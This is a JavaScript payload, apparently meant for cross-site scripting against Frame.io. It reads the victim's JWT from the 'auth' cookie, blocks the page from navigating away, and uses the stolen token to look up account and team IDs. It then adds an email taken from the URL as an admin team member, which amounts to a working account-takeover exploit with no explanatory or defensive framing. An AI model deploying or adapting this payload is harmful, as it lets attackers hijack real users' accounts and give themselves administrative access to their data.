// Step 1: Extract the JWT from the "auth" cookie and save it in a variable
const cookieValue = document.cookie.split('; ').find(row => row.startsWith('auth=')).split('=')[1];
const jwt = decodeURIComponent(cookieValue).replace('Bearer%20', '');

// Step 1.1: Extract the 'email' parameter from the URL
const urlParams = new URLSearchParams(window.location.search);
const email = urlParams.get('email');

if (!email) {
    console.error("Email parameter is missing in the URL");
} else {
    let isRedirectPrevented = true; // Flag to indicate redirection prevention

    // Prevent the default navigation behavior
    window.addEventListener('beforeunload', function (event) {
        if (isRedirectPrevented) {
            event.preventDefault(); // Prevent the default action
            event.returnValue = ''; // Chrome requires returnValue to be set
        }
    });

    // Step 2: Send XHR request to get account_id
    const getAccounts = new XMLHttpRequest();
    getAccounts.open('GET', 'https://api.frame.io/v2/accounts', true);
    getAccounts.setRequestHeader('Authorization', `Bearer ${jwt}`);
    getAccounts.onreadystatechange = function () {
        if (getAccounts.readyState === 4 && getAccounts.status === 200) {
            const response = JSON.parse(getAccounts.responseText);
            const accountId = response[0].id; // Assume the first account
            console.log('Account ID:', accountId);

            // Step 3: Send another XHR to get team_id
            const getProjects = new XMLHttpRequest();
            getProjects.open('POST', `https://api.frame.io/v2/browse/accounts/${accountId}/projects`, true);
            getProjects.setRequestHeader('Authorization', `Bearer ${jwt}`);
            getProjects.setRequestHeader('Content-Type', 'application/json');
            getProjects.onreadystatechange = function () {
                if (getProjects.readyState === 4 && getProjects.status === 200) {
                    const projectResponse = JSON.parse(getProjects.responseText);
                    const teamId = projectResponse[0].team_id; // Assume the first project
                    console.log('Team ID:', teamId);

                    // Step 4: Send final XHR request to add a new team member
                    const addTeamMember = new XMLHttpRequest();
                    addTeamMember.open('POST', `https://api.frame.io/v2/browse/accounts/${accountId}/team_memberships`, true);
                    addTeamMember.setRequestHeader('Authorization', `Bearer ${jwt}`);
                    addTeamMember.setRequestHeader('Content-Type', 'application/json');
                    addTeamMember.onreadystatechange = function () {
                        if (addTeamMember.readyState === 4) {
                            console.log('Add Team Member Response:', addTeamMember.responseText);
                            isRedirectPrevented = false; // Allow redirection after completion
                        }
                    };
                    const requestBody = {
                        email: email,
                        admin: true,
                        team_ids: [teamId]
                    };
                    addTeamMember.send(JSON.stringify(requestBody));
                }
            };
            getProjects.send('{}');
        }
    };
    getAccounts.send();
}
